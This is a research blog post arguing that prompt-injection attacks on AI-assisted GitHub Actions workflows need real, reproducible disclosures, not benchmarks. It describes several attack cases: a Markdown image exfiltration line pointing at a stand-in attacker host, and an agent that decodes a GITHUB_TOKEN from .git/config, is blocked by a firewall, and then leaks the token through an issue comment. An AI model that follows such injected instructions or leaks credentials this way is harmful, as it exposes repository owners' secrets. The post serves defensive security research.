# We cannot simulate AI security research

- URL: https://www.lesswrong.com/posts/hrrhtxnFYYJFHcTz7/we-cannot-simulate-ai-security-research-1
- Author: Jafar Isbarov
- Date: 2026-07-22
- Karma: 8  Comments: 0  Words: 1385
- Band: B  Tier: 1  Score: 41.5  Density: 9.68
- Anchors: \bharness(es|ing)?\b, claude code, \bcodex\b

---

We use AI agents not only for writing but also for maintaining and deploying code. The most widespread examples are found in GitHub Actions Marketplace, which contains over a thousand AI-assisted actions.[^cklq2719jn] These workflows triage issues, review PRs, or fix bugs in other workflows. A growing body of reports and research papers has documented prompt injection attacks against these systems, with effects ranging from LLM token exfiltration to supply chain attacks. However, a troubling undercurrent runs through most of these works: incomplete attack descriptions, a lack of end-to-end runs, and statistical approaches to what should be incident analysis. AI security research often tests attacks inside benchmarks, simplified harnesses, or static models of a system. This is useful for comparing models, but it can hide the details that determine whether an attack works in practice: who can trigger the workflow, what context the agent sees, which credentials it receives, what the sandbox allows, and how the surrounding software handles its output.

Most reported vulnerabilities are not viable
============================================

There is a recent trend of reporting vulnerabilities in these AI-assisted workflows, most of which rely on prompt injection attacks. Most of the reported attacks are proofs of concept that do not work in practice. The reason is the multiple independent defense layers scattered across the workflow files, GitHub ecosystem, and LLM providers.

In general, a prompt injection attack against an AI agent in a GitHub Action has to bypass the following defenses:

1.  Access to trigger a workflow.
2.  Access to the agent context: this is not guaranteed because different workflows use different harnesses and restrict what an LLM sees.
3.  Deceiving the LLM: this is getting more and more challenging with frontier LLMs, although deceiving frontier models like Gemini 3 or Grok 4 is still viable.[^iigzlkswg0j]
4.  Getting the LLM to do meaningful damage: even if the LLM is deceived, its GitHub token has limited access and is not useful for serious supply chain attacks.

The earliest prompt injection attack against AI-assisted GitHub Workflows was PromptPwnd.[^alyozuzvsv4] In this case, the authors claim success with Gemini CLI, Claude Code, OpenAI Codex, and GitHub AI Inference, but only 1 of 4 claimed targets was demonstrated, and no reproduction steps were released for the remaining targets.

In another case[^zmfisezmfi], researchers perform a prompt injection where any external user can file an issue that triggers an agentic workflow and makes it post repository contents back as a public comment. The trigger itself needs no privileged access, but exfiltrating a separate private repository in the same organization only works because the agent was configured with a credential granting organization-wide read access. This is a convenient but very permissive setting. A workflow relying on the default `GITHUB_TOKEN`, which is scoped to the single repository it runs in, cannot reach other private repos at all. The impact then collapses to the workflow's own repository (leaking its own secrets, say) rather than the cross-repo private leak that makes the result striking.

Another example is Wang et al.[^1tkw3k9ssyi], who developed a static taint analyzer and used it to identify hundreds of vulnerabilities. But the authors concede that these attacks were discovered via static analysis of workflow files, not live exploitation on real repositories. And given the information above, we have good reason to think that most of these attacks would not work in real-world scenarios. This problem is not specific to GitHub Actions. Red-teaming works in AI security make too many assumptions that don't hold in real-world scenarios. The flip side of this coin is that using simulated environments can create false negatives as easily as it creates false positives.

Simulated environments miss new attacks
=======================================

Just like a simulated environment can miss certain defensive measures, it can also lack network, OS, or implementation details that could enable new attacks. Static analysis of a GitHub Workflow file would reveal potential attack surfaces but not actual attack scenarios. One of the most infamous examples was Markdown injection.[^qderfhh16ms] An injection causes the model to generate a Markdown image whose URL contains sensitive conversation data. When the client automatically fetches that image, the request sends the encoded data to the attacker:

!\[data exfiltration in progress\](https://attacker/q=\*exfil_data\*)

This vulnerability was disclosed in 2023. At the time, no AI security benchmark or framework was rich enough to capture it. Despite its simplicity, this single report has had a more profound impact on AI security than any benchmark developed since.

To give a more recent example, one confirmed vulnerability exploits a credential storage decision made by `actions/checkout`, which writes the `GITHUB_TOKEN` as a base64-encoded authorization header into `.git/config`.[^tduql5hyt] The attack vector was only discoverable through real execution. Two simpler attempts failed against sandbox and network constraints that a simulator would not have enforced. The first attempt was to read the `GITHUB_TOKEN` environment variable, but it was not available. The second attempt was to decode the discovered authorization header and send it as a curl request to another website, but the firewall blocked this. Only the third attempt succeeded by decoding the header and posting it as a comment under an issue on the same GitHub repo. As of July 2026, no AI security benchmark or framework would enable this attack. A static analysis tool that reads only the workflow file would assume access to the GitHub token, but would not consider how it would be accessed by a rogue agent. It could also miss firewall rules, especially given that these rules are flexible and can be changed by the repo owner.

We need vulnerability disclosures, not benchmarks
=================================================

Benchmarks like AgentDojo and ToolEmu are useful for comparing the robustness of different LLMs, but their results don't directly translate to real-world security or lack thereof. We should not approach the security of AI agents as only a machine learning problem. If a system has a vulnerability, it has to be reported in a fully reproducible manner. A disclosure has to name the exact model, harness, and versions; state who can trigger the workflow and with what privilege; describe what the agent actually sees and which credentials it holds, at what scope; specify the sandbox, network, and filesystem constraints in force; and give the verbatim payload with the observed end-to-end effect rather than the theoretical maximum, including the attempts that failed and what stopped them, since those are exactly what a simulated result can't show you.

An AI model, or a model+harness, achieving X% attack success rate (ASR) on a Y benchmark does not say much about the security of a software system. While we replicated existing attacks in various GitHub Workflows, we also discovered the following:

*   Most workflows are not triggered automatically if you are not a collaborator. You need to turn it on manually. Almost nobody does this.
*   If you leak an OpenAI API key of the LLM provider, this is detected, reported, and blocked by the provider in a short window.
*   If you leak the default `GITHUB_TOKEN`, it is far less dangerous than an organization-wide personal access token (PAT), since it is short-lived and scoped to the workflow's own repository. It can still read, comment on, and (with write access) modify that repository, as long as the workflow is running.

This does not mean we cannot have a systematic approach to AI security, nor that we cannot automate the process. But in the end, what matters are reproducible vulnerability disclosures. Any AI red-teaming work should have that as the final goal, or should work towards facilitating future disclosures.

An example of this is our GitInject framework, which enables fully reproducible automated attacks against GitHub Workflows.[^s65vxywuhui] Instead of simulating the attack environment or relying on static analysis of the workflows, we built a framework for creating and red-teaming ephemeral repositories in a fully reproducible and scalable manner. By using different accounts for the attacker and the defender, we can ensure that the test environment is as real as any production repository. This framework was used to detect shortcomings of existing attacks (discussed above) and to discover a new prompt injection attack called *config-file prompt injection*. Several early attempts were discarded as false positives before reaching the final solution. It also provides a stable interface for AI agents to discover new vulnerabilities.

[^cklq2719jn]: https://github.com/marketplace?type=actions&category=ai-assisted 

[^iigzlkswg0j]: https://arxiv.org/abs/2603.15714 

[^alyozuzvsv4]: https://www.aikido.dev/blog/promptpwnd-github-actions-ai-agents 

[^zmfisezmfi]: https://noma.security/blog/gitlost-how-we-tricked-githubs-ai-agent-into-leaking-private-repos 

[^1tkw3k9ssyi]: https://arxiv.org/abs/2605.07135 

[^qderfhh16ms]: https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection 

[^tduql5hyt]: https://arxiv.org/abs/2606.09935 

[^s65vxywuhui]: https://github.com/ceferisbarov/GitInject